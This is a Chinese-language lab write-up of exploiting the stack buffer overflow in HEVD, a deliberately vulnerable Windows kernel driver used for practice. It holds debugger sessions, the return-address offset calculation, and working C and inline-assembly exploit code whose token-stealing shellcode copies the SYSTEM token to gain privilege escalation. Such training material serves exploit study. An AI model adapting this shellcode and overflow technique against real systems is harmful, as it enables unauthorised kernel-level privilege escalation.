* * *

# hevd windows内核漏洞练习-BUFFER_OVERFLOW_STACK

使用的环境是hevd的windows 内核漏洞靶场.

直接找到iocontrol的回调函数,还有驱动的符号链接,调用其中有漏洞的函数,双机调试使用了

windbg preview和virtualkd-redux  
![image](https://image.3001.net/images/20230728/1690553790_64c3cdbe8d325930055a4.png!small)

对应的code码.  
![image](https://image.3001.net/images/20230728/1690553826_64c3cde213b7393faebed.png!small)

## 1.漏洞分析

BUFFER_OVERFLOW_STACK栈溢出漏洞,未对栈中的空间做有效的限制和验证,导致栈中数据覆盖到了其他位置.

TriggerBufferOverflowStack,未对ring3层用户传入的数据长度做限制,这个函数开了长度为0x81C大小的栈.如果长度超过,memcpy时会产生栈溢出.

    
    
    int __stdcall TriggerBufferOverflowStack(void *UserBuffer, unsigned int Size)
    {
      unsigned int KernelBuffer[512]; // [esp+10h] [ebp-81Ch] BYREF
      CPPEH_RECORD ms_exc; // [esp+814h] [ebp-18h]
    
      memset(KernelBuffer, 0, sizeof(KernelBuffer));
      ms_exc.registration.TryLevel = 0;
      ProbeForRead(UserBuffer, 0x800u, 1u);
      _DbgPrintEx(0x4Du, 3u, "[+] UserBuffer: 0x%p\n", UserBuffer);
      _DbgPrintEx(0x4Du, 3u, "[+] UserBuffer Size: 0x%X\n", Size);
      _DbgPrintEx(0x4Du, 3u, "[+] KernelBuffer: 0x%p\n", KernelBuffer);
      _DbgPrintEx(0x4Du, 3u, "[+] KernelBuffer Size: 0x%X\n", 0x800);
      _DbgPrintEx(0x4Du, 3u, "[+] Triggering Buffer Overflow in Stack\n");
      memcpy(KernelBuffer, UserBuffer, Size);
      return 0;
    }
    

先正常调用下看看

windbg显示dbgprint的输出日志,如下命令:

    
    
    ed nt!kd_ihvdriver_mask 8
    ed nt!Kd_Default_Mask 8
    

添加hevd的符号

    
    
    .sympath+ $path
    

成功加载  
![image](https://image.3001.net/images/20230728/1690553844_64c3cdf49ce2fe056fc02.png!small)  
对目标函数下断点

    
    
    bp hevd!TriggerBufferOverflowStack
    

编写程序

    
    
    #define HEVD_IOCTL_BUFFER_OVERFLOW_STACK					0x222003
    
    VOID BUFFER_OVERFLOW_STACK_test(HANDLE dev) {
    	CHAR* buf;
    	DWORD dwRet = 0;
    	int bufLen = 0x800;
    	buf = (CHAR*)malloc(bufLen);
    	memset(buf, 0x41, bufLen);
    	DeviceIoControl(dev, HEVD_IOCTL_BUFFER_OVERFLOW_STACK, buf, bufLen, NULL, 0, &dwRet, NULL);
    	CloseHandle(dev);
    }
    
    int main()
    {
    
    	HANDLE dev = NULL;
    	dev = CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver", GENERIC_READ | GENERIC_WRITE, NULL, NULL, OPEN_EXISTING, NULL, NULL);
    	if (dev == INVALID_HANDLE_VALUE)
    	{
    		printf("Failed!\n");
    		system("pause");
    		return -1;
    	}
    	BUFFER_OVERFLOW_STACK_test(dev);
    	system("pause");
    	system("cmd.exe");
    
    	return 0;
    }
    

这里可以计算出返回地址的偏移,0x8c7c6ab4-0x8c7c6294=0x820.

或者口算出也可以,当前栈空间为0x81c,+4(ebp).就是返回地址的偏移了.

所以我们的数据长度时0x824,就可以把返回地址覆盖掉了.

    
    
    Breakpoint 0 hit
    HEVD!TriggerBufferOverflowStack:
    9244d1a2 680c080000      push    80Ch
    kd> dd esp
    8c7c6ab4  9244d19a 00454418 00000800 8c7c6adc
    8c7c6ac4  9244c0ba 86632328 86632398 86640468
    8c7c6ad4  8666b5a0 00000000 8c7c6af4 83e81f87
    8c7c6ae4  8666b5a0 86632328 86632328 8666b5a0
    8c7c6af4  8c7c6b14 8407feec 00000000 86632328
    8c7c6b04  86632398 00000094 047c6bac 8c7c6b24
    8c7c6b14  8c7c6bd0 840832a8 8666b5a0 86640468
    8c7c6b24  00000000 00000101 00021b01 00000002
    kd> bp 0xffffffff9244d235
    kd> g
    [+] UserBuffer: 0x00454418
    [+] UserBuffer Size: 0x800
    [+] KernelBuffer: 0x8C7C6294
    [+] KernelBuffer Size: 0x800
    [+] Triggering Buffer Overflow in Stack
    Breakpoint 1 hit
    HEVD!TriggerBufferOverflowStack+0x93:
    9244d235 e8a2bffbff      call    HEVD!memcpy (924091dc)
    kd> dd esp
    8c7c626c  8c7c6294 00454418 00000800 0000004d
    8c7c627c  00000003 9244f616 cde6d53f 86632328
    8c7c628c  83f1017c 86632398 00000000 00000000
    8c7c629c  00000000 00000000 00000000 00000000
    8c7c62ac  00000000 00000000 00000000 00000000
    8c7c62bc  00000000 00000000 00000000 00000000
    8c7c62cc  00000000 00000000 00000000 00000000
    8c7c62dc  00000000 00000000 00000000 00000000
    

## 2.漏洞利用

提权漏洞利用:

简而言之,就是将system的token值替换到当前进程上,完成提权:

通过ring0中fs寄存器,也就是kpcr结构,fs[0x124]中_KTHREAD结构,_KTHREAD+0x50然后找到_EPROCESS进程内核对象.

    
    
    kd> dt _kpcr
    nt!_KPCR
       +0x000 NtTib            : _NT_TIB
       +0x000 Used_ExceptionList : Ptr32 _EXCEPTION_REGISTRATION_RECORD
       +0x004 Used_StackBase   : Ptr32 Void
       +0x008 Spare2           : Ptr32 Void
       +0x00c TssCopy          : Ptr32 Void
       +0x010 ContextSwitches  : Uint4B
       +0x014 SetMemberCopy    : Uint4B
       +0x018 Used_Self        : Ptr32 Void
       +0x01c SelfPcr          : Ptr32 _KPCR
       +0x020 Prcb             : Ptr32 _KPRCB
       +0x024 Irql             : UChar
       +0x028 IRR              : Uint4B
       +0x02c IrrActive        : Uint4B
       +0x030 IDR              : Uint4B
       +0x034 KdVersionBlock   : Ptr32 Void
       +0x038 IDT              : Ptr32 _KIDTENTRY
       +0x03c GDT              : Ptr32 _KGDTENTRY
       +0x040 TSS              : Ptr32 _KTSS
       +0x044 MajorVersion     : Uint2B
       +0x046 MinorVersion     : Uint2B
       +0x048 SetMember        : Uint4B
       +0x04c StallScaleFactor : Uint4B
       +0x050 SpareUnused      : UChar
       +0x051 Number           : UChar
       +0x052 Spare0           : UChar
       +0x053 SecondLevelCacheAssociativity : UChar
       +0x054 VdmAlert         : Uint4B
       +0x058 KernelReserved   : [14] Uint4B
       +0x090 SecondLevelCacheSize : Uint4B
       +0x094 HalReserved      : [16] Uint4B
       +0x0d4 InterruptMode    : Uint4B
       +0x0d8 Spare1           : UChar
       +0x0dc KernelReserved2  : [17] Uint4B
       +0x120 PrcbData         : _KPRCB
    
    
    
    kd> dt _KPRCB
    nt!_KPRCB
       +0x000 MinorVersion     : Uint2B
       +0x002 MajorVersion     : Uint2B
       +0x004 CurrentThread    : Ptr32 _KTHREAD
    

_KTHREAD+0x50

    
    
    +0x040 ApcState         : _KAPC_STATE
          +0x000 ApcListHead      : [2] _LIST_ENTRY
          +0x010 Process          : Ptr32 _KPROCESS 
          +0x014 KernelApcInProgress : UChar
          +0x015 KernelApcPending : UChar
          +0x016 UserApcPending   : UChar
       +0x040 ApcStateFill     : [23] UChar
    

windows进程内核对象_EPROCESS中0xf8偏移出就是token.然后进行遍历0xb8处进程活动链表,通过对比0xb4处进程id找到system进程,将token替换到当前进程,完成提权.

    
    
    kd> dt _eprocess
    nt!_EPROCESS
       +0x000 Pcb              : _KPROCESS
       +0x098 ProcessLock      : _EX_PUSH_LOCK
       +0x0a0 CreateTime       : _LARGE_INTEGER
       +0x0a8 ExitTime         : _LARGE_INTEGER
       +0x0b0 RundownProtect   : _EX_RUNDOWN_REF
       +0x0b4 UniqueProcessId  : Ptr32 Void
       +0x0b8 ActiveProcessLinks : _LIST_ENTRY
       +0x0c0 ProcessQuotaUsage : [2] Uint4B
       +0x0c8 ProcessQuotaPeak : [2] Uint4B
       +0x0d0 CommitCharge     : Uint4B
       +0x0d4 QuotaBlock       : Ptr32 _EPROCESS_QUOTA_BLOCK
       +0x0d8 CpuQuotaBlock    : Ptr32 _PS_CPU_QUOTA_BLOCK
       +0x0dc PeakVirtualSize  : Uint4B
       +0x0e0 VirtualSize      : Uint4B
       +0x0e4 SessionProcessLinks : _LIST_ENTRY
       +0x0ec DebugPort        : Ptr32 Void
       +0x0f0 ExceptionPortData : Ptr32 Void
       +0x0f0 ExceptionPortValue : Uint4B
       +0x0f0 ExceptionPortState : Pos 0, 3 Bits
       +0x0f4 ObjectTable      : Ptr32 _HANDLE_TABLE
       +0x0f8 Token            : _EX_FAST_REF
       +0x0fc WorkingSetPage   : Uint4B
    

构造exp,需要注意下堆栈的平衡,我这里,会多生成几行汇编,需要pop掉,环境不一样,这里可能有些区别.让它执行完后返回到IrpDeviceIoCtlHandler就可以.

    
    
    VOID shellcode() {
    	__asm
    	{
    		pop    edi
    		pop    esi
    		pop    ebx
    		pushad
    		mov eax, fs: [124h]
    		mov eax, [eax + 050h]
    		mov ecx, eax
    		mov edx, 4
    
    		find_sys_pid :
    		mov eax, [eax + 0b8h]
    		sub eax, 0b8h
    		cmp[eax + 0b4h], edx
    		jnz find_sys_pid
    
    		mov edx, [eax + 0f8h]
    		mov[ecx + 0f8h], edx
    		popad
    		pop ebp
    		ret 8
    	}
    }
    
    
    
    VOID BUFFER_OVERFLOW_STACK(HANDLE dev) {
    	CHAR* buf;
    	DWORD dwRet = 0;
    	int bufLen = 0x824;
    	buf = (CHAR*)malloc(bufLen);
    	memset(buf, 0x41, bufLen);
    	*(PDWORD)(buf + 0x820) = (DWORD)&ampshellcode
    	DeviceIoControl(dev, HEVD_IOCTL_BUFFER_OVERFLOW_STACK, buf, bufLen, NULL, 0, &dwRet, NULL);
    	CloseHandle(dev);
    }
    

运行结果:  
![image](https://image.3001.net/images/20230728/1690553879_64c3ce17607ba11955d11.png!small)

